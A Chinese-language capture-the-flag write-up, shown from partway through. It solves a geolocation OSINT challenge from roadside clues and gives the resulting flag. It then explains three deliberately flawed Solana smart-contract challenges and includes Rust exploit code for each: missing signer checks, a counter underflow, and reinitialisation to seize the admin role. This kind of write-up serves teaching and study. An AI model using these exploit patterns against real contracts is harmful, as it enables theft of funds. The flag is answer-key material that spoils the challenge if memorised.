2.png: Ecuador
3.png: Spain
4.png: Thailand
5.png: Vatican City
6.png: Finland
7.png: Lithuania
8.png: Argentina
9.png: Georgia
```

这个题目可谓是相当折磨,并且还有部分涉及到一些奇奇怪怪的知识(比如通过街边的路标得知是哪个国家的道路,以及一些呼吸管什么奇怪的东西.总而言之十分有趣,故此总结)

标注:编写wp的时候参考了部分来自以下两篇优秀博文的内容

https://enscribe.dev/ctfs/idek/osint/nmpz/

https://www.louiskronberg.de/blog/geo.html

一些有帮助的网站:

https://populationstat.com/countries/ 查询国家人口数

https://www.geoguessr.com/ geoguesser的相关网站 

https://geohints.com 同上

https://lens.google/ google识图

https://www.google.com/maps google地图

第一张图 巴西 Brazil 216,642,000 > 10,000,000 --> `idek{B`

![](https://imgur.com/ECMDjsC.png)

![](https://imgur.com/XhlekIF.png)

巴西的里约热内卢著名的基督像-救世基督像 所以一定的巴西

第二张图 俄罗斯 Russia 143,110,000 > 10,000,000  --> `idek{BR`

![](https://imgur.com/HEAZwD8.png)

![](https://imgur.com/6crgGsZ.png)

可以得知,圣瓦西里大教堂(St Basil's Cathedral)在俄罗斯红场

第三张图 塔林 Estonia 1,000,000 < 1,319,000 < 10,000,000 --> `idek{BRe`

![](https://imgur.com/UkTTRVI.png)

可以看到路标 `Kalamaja`

![](https://imgur.com/FKFwILB.png)

![](https://imgur.com/xVa4W34.png)

可以搜到其在爱沙尼亚首都塔林的北塔林区的一个街区

所以是爱沙尼亚

第四张图 澳大利亚 Australia 26,278,000 > 10,000,000 --> `idek{BReA`

![](https://imgur.com/6DZDLtf.png)

Google识图 应该可以直接搞出来是 斯图尔特公路(英语:StuartHighway) 澳大利亚

![](https://imgur.com/roljo10.png)

当然也可以通过公路旁边的护柱 来进行判断

![](https://imgur.com/94EUStv.png)

可以通过https://geohints.com/Bollards 进行查询 可以找到类似的信息

![](https://imgur.com/K78tOdq.png)

同时还有红土 红土在澳大利亚特有

第五张图 肯尼亚 Kenya 57,459,000  > 10,000,000 --> `idek{BReAK`

![](https://imgur.com/c9jQExg.png)

第五张图比较困难 你可能会收到来自 `AL-SRAAD FLAZA`等信息的一些提示

![](https://imgur.com/qDl4reR.png)

同时你可以结合一些阿拉伯语特征得知其应该是一个讲阿拉伯语的国家

![](https://imgur.com/nWGz0IY.png)

不过这些很难以锁定于这个国家的一些相关信息 不过很关键的在这里,汽车有一个类似于通气管的东西

![](https://imgur.com/TN8N1du.png)

经过搜索我找到了这个东西
https://twitter.com/geoguessr/status/1564621460034969606

![](https://imgur.com/LKHqyZB.png)

所以最后的国家是肯尼亚 奇怪的知识增加了!
另外可以搜索`peri peri pizza third street`也可以找到

![](https://imgur.com/XcF5srC.png)

第六张图 冰岛 Iceland 376,000 < 1,000,000 --> `idek{BReAK_`

![](https://imgur.com/VVX7vt7.png)

本题可以有三种做法
1. google识图可以大部分确定是来自冰岛

![](https://imgur.com/7KvDVE2.png)

2. 通过路标 可以进行一部分的识别

![](https://imgur.com/rPudJwO.png)

![](https://imgur.com/dxrqWOV.png)

3. 通过街景可以得到一些信息 比如阴间 白色的虚线 黄绿色草地等等

![](https://imgur.com/PIbUmfq.png)

![](https://imgur.com/ApNCh7p.png)

第七张图 蒙古 Mongolia 1,000,000 < 3,425,000 < 10,000,000 --> `idek{BReAK_m`

![](https://imgur.com/sKHWZwE.png)

万能google视图显示其来自蒙古

![](https://imgur.com/sjpuWg1.png)

第八张图 可能是e 因为前面有个m 猜一下可能是e但是不确定是不是E还是e 最后flag提交是e --> `idek{BReAK_me` 不太会社 他们讨论得出的国家是斯威士兰 
估计是特殊的平顶山地形进行的范围缩小

![](https://imgur.com/x6kkcD0.png)

第九张图 摩纳哥 Monaco 40,000 < 1,000,000 --> `idek{BReAK_me_`

![](https://imgur.com/wu91Oqt.png)

可以找到一个地标性建筑 蒙特卡洛歌剧院 位于摩纳哥

![](https://imgur.com/RNL3Crd.png)

第十张图 瑞士 switzerland  1,000,000 < 8,805,000 < 10,000,000 --> `idek{BReAK_me_s`

![](https://imgur.com/T59wNT6.png)

其实可以通过这里获得 瑞士国旗

![](https://imgur.com/Wpmjacl.png)

第十一张图 波兰 Poland 37,647,000 > 10,000,0000 --> `idek{BReAK_me_sP`

![](https://imgur.com/e8WV8OS.png)

护柱大法好

![](https://imgur.com/rZGAxjy.png)

![](https://imgur.com/XC4bbxb.png)

同时双中心道路线、道路虚线也可以锁定其来自于波兰
第十二张图 奥地利 Austria 1,000,000 < 8,978,000 < 10,000,000 --> `idek{BReAK_me_sPa`

![](https://imgur.com/kLNKUsw.png)

我们可以锁定这里`ELEKTRO Weißensteiner` 

![](https://imgur.com/nCyW6DS.png)

Google map可以搜到`Elektro Weißensteiner GmbH`位于奥地利

![](https://imgur.com/gyOHS1k.png)

![](https://imgur.com/4zUTJ9A.png)

第十三张图 加拿大 Canada 38,864,000 > 10,000,000 --> `idek{BReAK_me_sPaC`

![](https://imgur.com/Oj2PtCc.png)

通过Google识图得知其应该来自于北美地区也就是我们需要区别美国和加拿大

![](https://imgur.com/i3st5oN.png)

本题需要通过图上的虚线进行区分

![](https://imgur.com/8as1rhm.png)

似乎这种单虚线的黄线只有加拿大才会出现,美国和加拿大共有双实线黄线和一实一虚的黄线

如果从气象上来看,其更冷,可能更偏向于北方地区,也就是加拿大

第十四张图 厄瓜多尔 Ecuador 18,324,000 > 10,000,000 --> `idek{BReAK_me_sPaCE`

![](https://imgur.com/gJyMZGJ.png)

然后我们可以从车牌来进行进一步的约束 可以得知是厄瓜多尔的出租车车牌

![](https://imgur.com/TW0uI7Z.png)

![](https://imgur.com/fFxaiQ7.png)

另外也可以通过指向进行进一步的范围缩小 淡黄色,单极,2 个相邻的指向  

![](https://imgur.com/JEsghus.png)

第十五张图 保加利亚 Bulgaria 1,000,000 < 6,793,000 < 10,000,000 --> `idek{BReAK_me_sPaCEb`

![](https://imgur.com/5pMK1WQ.png)

可以注意这个垃圾桶

![](https://imgur.com/C4NKG6k.png)

可以得到类似于KMA的字符 可以搜索得知其基本供货于东欧,俄罗斯地区

![](https://imgur.com/htNtDfA.png)

同时常年下雪以及一些道路基础较差可以得到相关的信息其来自于保加利亚

第十六张图 阿尔巴尼亚 Albania  1,000,000 < 2,796,000 < 10,000,000 --> `idek{BReAK_me_sPaCEba`

![](https://imgur.com/ea5qUHy.png)

可以通过两部分判断 一个是特殊的人字形符号

![](https://imgur.com/DgCoDQl.png)

可以发现这样的一张图
https://www.reddit.com/r/geoguessr/comments/lwa9wr/map_of_european_road_curve_chevron_signs/

![](https://imgur.com/Lfoakxt.png)

可以得知使用黑底白字的国家是英国、瑞士、意大利、希腊、阿尔巴尼亚还有西班牙
同时在图片的上方有个奇怪的折痕

![](https://imgur.com/qDNkWjl.png)

在一些特定的国家中,Photo Sphere的相机有一些缺陷导致了这些折痕这里可以查到
https://geohints.com/Rifts

![](https://imgur.com/VEborou.png)

所以该国家是阿尔巴尼亚

第十七张图 俄罗斯 Russia 143,110,000 > 10,000,000  --> `idek{BReAK_me_sPaCEbaR}`

![](https://imgur.com/Fek16KK.png)

本题是我认为最抽象的,大部分比赛时候的解决方案基本上都是进行直接的单词猜测但是其预期的思路是分析这个植物

![](https://imgur.com/3indKEU.png)

https://en.wikipedia.org/wiki/Petasites_japonicus 也就是蜂斗菜,它原产于库页岛、日本、中国和韩国地区

所以本题所在的地区应该是库页岛上,所以是俄罗斯

总而言之 奇奇怪怪的知识增加了

最后flag --> `idek{BReAK_me_sPaCEbaR}`

## BlockChain:

### Baby Solana 1:

```rust
pub struct Deposit<'info> {
    #[account(
        mut,
        seeds = [ b"CONFIG" ],
        bump,
        has_one = admin
    )]
    pub config: Account<'info, Config>,

    #[account(
        mut,
        seeds = [ b"RESERVE" ],
        bump,
        constraint = reserve.mint == mint.key(),
    )]
    pub reserve: Account<'info, TokenAccount>,

    #[account(
        mut,
        seeds = [b"account", user.key().as_ref()],
        bump,
        constraint = user_account.mint == mint.key(),
        constraint = user_account.owner == user.key(),
    )]
    pub user_account: Account<'info, TokenAccount>,

    pub mint: Account<'info, Mint>,

    #[account(mut)]
    pub admin: AccountInfo<'info>,
    
    #[account(mut)]
    pub user:  Signer<'info>,
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}
```

Despoit函数不需要admin的签名，可以被任意调用

利用：

```rust
let deposit_accounts = chall::cpi::accounts::Deposit {
            config: ctx.accounts.config.to_account_info(),
            reserve: ctx.accounts.reserve.to_account_info(),
            user_account: ctx.accounts.user_account.to_account_info(),
            mint: ctx.accounts.mint.to_account_info(),
            admin: ctx.accounts.admin.to_account_info(),
            user: ctx.accounts.user.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_deposit = CpiContext::new(ctx.accounts.chall.to_account_info(), deposit_accounts);
        chall::cpi::deposit(cpi_deposit, 200)?;
```
       
### Baby Blockchain 2:

```rust
pub fn attempt(ctx: Context<Attempt>) -> Result<()> {
    let record = &mut ctx.accounts.record;
    msg!("[CHALL] attempt.tries {}", record.tries);
    if record.tries > 0 {
        let reserve_bump = [*ctx.bumps.get("reserve").unwrap()];
        let signer_seeds = [
            b"RESERVE",
            reserve_bump.as_ref()
        ];
        let signer = &[&signer_seeds[..]];

        let withdraw_ctx = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.reserve.to_account_info(),
                to: ctx.accounts.user_account.to_account_info(),
                authority: ctx.accounts.reserve.to_account_info()
            },
            signer
        );
        token::transfer(withdraw_ctx, record.tries as u64)?;
    }

    record.tries -= 1;

    Ok(())
}
```
每次调用attempt会 record.tries -= 1 初始化给予3 tries，连续四次调用溢出

利用：

```rust
 for _n in 1..4 {
        let cpi_accounts = chall::cpi::accounts::Attempt {
            reserve: ctx.accounts.reserve.to_account_info(),
            record: ctx.accounts.user_record.to_account_info(),
            user_account: ctx.accounts.user_account.to_account_info(),
            mint: ctx.accounts.mint.to_account_info(),
            user: ctx.accounts.user.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        chall::cpi::attempt(cpi_ctx)?;
    }
```

### Baby Blockchain 3:

比赛中没用做出来 差了一点点 赛后复现

```rust
pub struct Initialize<'info> {
    #[account(
        init_if_needed,
        seeds = [ b"CONFIG" ],
        bump,   
        payer = admin,
        space = Config::SIZE,
    )]
    pub config: Account<'info, Config>,

    #[account(
        init_if_needed,
        seeds = [ b"RESERVE" ],
        bump,
        payer = admin,
        token::mint = mint,
        token::authority = reserve
    )]
    pub reserve: Account<'info, TokenAccount>,

    pub mint: Account<'info, Mint>,
    #[account(mut)]
    pub admin: Signer<'info>,
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}
```
init_if_needed使得合约可以被再次初始化

利用：
```rust
 let reinitialize = chall::cpi::accounts::Initialize {
            config: ctx.accounts.config.to_account_info(),
            reserve: ctx.accounts.reserve.to_account_info(),
            mint: ctx.accounts.mint.to_account_info(),
            admin: ctx.accounts.user.to_account_info(), //make me admin
            token_program: ctx.accounts.token_program.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_reinit = CpiContext::new(ctx.accounts.chall.to_account_info(), reinitialize);
        chall::cpi::initialize(cpi_reinit)?;

        let deposit_accounts = chall::cpi::accounts::Deposit {
            config: ctx.accounts.config.to_account_info(),
            reserve: ctx.accounts.reserve.to_account_info(),
            user_account: ctx.accounts.user_account.to_account_info(),
            mint: ctx.accounts.mint.to_account_info(),
            admin: ctx.accounts.user.to_account_info(), //i am now admin
            user: ctx.accounts.user.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_deposit = CpiContext::new(ctx.accounts.chall.to_account_info(), deposit_accounts);
        chall::cpi::deposit(cpi_deposit, 1000)?;
```
 anchor_lang: prelude文档(https://docs.rs/anchor-lang/latest/anchor_lang/prelude/index.html)

## 结语:

总而言之,其misc以及OSINT的部分题目比较有趣,故此分享.如果文章中有什么错误欢迎通过邮件指出感谢!
